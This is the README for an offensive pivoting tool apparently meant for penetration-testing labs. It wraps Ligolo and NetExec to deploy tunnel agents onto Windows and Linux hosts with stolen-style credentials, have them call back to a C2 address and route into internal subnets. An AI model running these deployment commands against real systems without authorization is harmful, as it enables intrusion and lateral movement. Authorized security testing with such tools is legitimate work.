# Ligolo UwU v2

All-in-One Ligolo Manager with direct upload method.
This tool is built of NXC, ensure to have it working prior to use. 
## Quick Start

```bash
# Install globally
./ligolo-uwu.sh install

# Download binaries
ligolo-uwu download

# Start proxy
ligolo-uwu proxy 443

# Add target and deploy (machines must be uppercase, I know I know)
ligolo-uwu add WIN01 <ip> <user> <pass> <c2_ip> 443 winrm

# Add route
ligolo-uwu route 172.16.70.0
```

## Syntax

### Installation
```bash
ligolo-uwu install                    # Install globally to /opt
ligolo-uwu clean                      # Clean up all lab files
ligolo-uwu clean --uninstall          # Clean up and uninstall
```

### Proxy Management
```bash
ligolo-uwu proxy <port> [interface]   # Start proxy server
ligolo-uwu download                   # Download latest binaries
```

### Route Management
```bash
ligolo-uwu route <network>            # Add route to ligolo interface
ligolo-uwu route-del <network>        # Remove route from ligolo interface
ligolo-uwu routes                     # List all ligolo routes
```

### Agent Deployment
```bash
ligolo-uwu agent <target_name>        # Deploy to saved target
ligolo-uwu <ip> <user> <pass> <c2_ip> <c2_port> <protocol> [--local-auth] [--debug]
```

### Target Management
```bash
ligolo-uwu add <name> <ip> <user> <pass> <c2_ip> <c2_port> <protocol> [--local-auth]
ligolo-uwu list                       # List saved targets
ligolo-uwu remove <target_name>       # Remove saved target
```

## Protocols
- `ssh` - Linux targets
- `winrm` - Windows targets (PowerShell)
- `smb` - Windows targets (cmd.exe)

## Flags
- `--local-auth` - Use local authentication (winrm/smb)
- `--debug` - Enable debug output

## Examples

```bash
# Windows targets
ligolo-uwu add WIN01 192.168.1.100 administrator 'Password1' 10.10.14.21 443 winrm 
ligolo-uwu add WIN03 192.168.1.100 user 'Pass123!' 10.10.14.21 443 smb

# Linux targets
ligolo-uwu add LINUX01 10.10.110.25 root 'toor' 10.10.14.21 443 ssh

# Quick deploy
ligolo-uwu 192.168.1.100 admin 'pass123' 10.10.14.21 443 winrm

# Routes
ligolo-uwu route 172.16.70.0          # Add /24 route
ligolo-uwu route 10.10.10.0/16        # Custom CIDR
ligolo-uwu routes                     # List routes
ligolo-uwu route-del 172.16.70.0      # Remove route

# Deploy to saved target
ligolo-uwu agent WIN01

# Clean up lab
ligolo-uwu clean
```
